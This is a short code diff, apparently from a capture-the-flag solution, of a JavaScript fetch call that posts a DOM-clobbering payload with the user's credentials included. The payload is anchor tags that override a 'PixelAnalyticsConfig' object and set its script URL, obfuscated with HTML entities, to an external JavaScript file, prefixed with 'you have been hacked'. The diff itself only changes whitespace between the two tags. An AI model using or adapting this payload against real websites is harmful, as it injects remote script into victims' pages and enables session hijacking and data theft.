@@ -11,8 +11,7 @@
         },
         credentials: 'include',
         body: JSON.stringify({ 
-            content: "you have been hacked <a id=PixelAnalyticsConfig name=enabled href=true>	
-	<a id=PixelAnalyticsConfig name=scr&#105ptUrl href=https://ctffiles&#46vercel&#46app/alet&#46js>" 
+            content: "you have been hacked <a id=PixelAnalyticsConfig name=enabled href=true> <a id=PixelAnalyticsConfig name=scr&#105ptUrl href=https://ctffiles&#46vercel&#46app/alet&#46js>" 
         })
     })
     .then(r => console.log("Initial POST Status:", r.status))
